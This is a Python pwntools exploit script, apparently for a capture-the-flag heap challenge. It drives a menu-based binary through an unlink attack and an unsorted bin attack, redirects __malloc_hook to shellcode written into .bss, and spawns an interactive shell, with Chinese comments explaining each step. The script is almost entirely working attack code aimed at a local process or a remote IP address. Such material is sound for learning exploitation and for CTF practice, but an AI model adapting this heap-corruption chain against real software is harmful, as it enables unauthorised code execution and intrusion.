from pwn import *

context.log_level='DEBUG'
context.binary = ELF('../file/timu_patch')
# context.binary = ELF('../file/timu')

p = process('../file/timu_patch')
# p = remote('61.147.171.105', '51313')

pause()

def create(size, data):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)

def delete(index):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index: ', str(index).encode())

def update(index, size, data):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index: ', str(index).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

create(0x100, b'aaaa')
create(0x100, b'aaaa')

# 将栈指针数组的第一项指向其-0x18偏移处
buf_addr = 0x601040
bss_addr = 0x601020
payload = p64(0) + p64(0x101) + p64(buf_addr-0x18) + p64(buf_addr-0x10) + 0xe0 * b'a' + p64(0x100) + p64(0x110)
update(0, len(payload), payload)
delete(1)

# 改写栈指针数组
payload = p64(0) + p64(0) + p64(0) + p64(bss_addr) + p64(buf_addr) + p64(0) + p64(0) + p64(0) + p64(0x20)
update(0, len(payload), payload)

# 创建buf[2]和buf[3]
create(0x100, b'aaaa')
create(0x100, b'aaaa')
delete(2)

# 让buf[6]等于main arena中的某个值（unsorted bin attack）
payload = p64(0) + p64(buf_addr+0x20)
update(2, len(payload), payload)
create(0x100, b'aaaa')

# 修改buf[6]，从main_arena变为__malloc_hook
payload = p64(bss_addr) + p64(buf_addr) + p64(0) * 4 + b'\x10'
update(1, len(payload), payload)

# bss地址写入shellcode
shellcode = asm(shellcraft.sh())
print(shellcode.hex())
update(0, len(shellcode), shellcode)

# 修改__malloc_hook指向bss地址
payload = p64(bss_addr)
update(6, len(payload), payload)

# 本地调试发现，已经转到执行shellcode，但是执行过程中报了段错误，因为bss段内存不可执行
# 远程攻击是生效的，应该是远程的内存段设置为可执行了
p.interactive()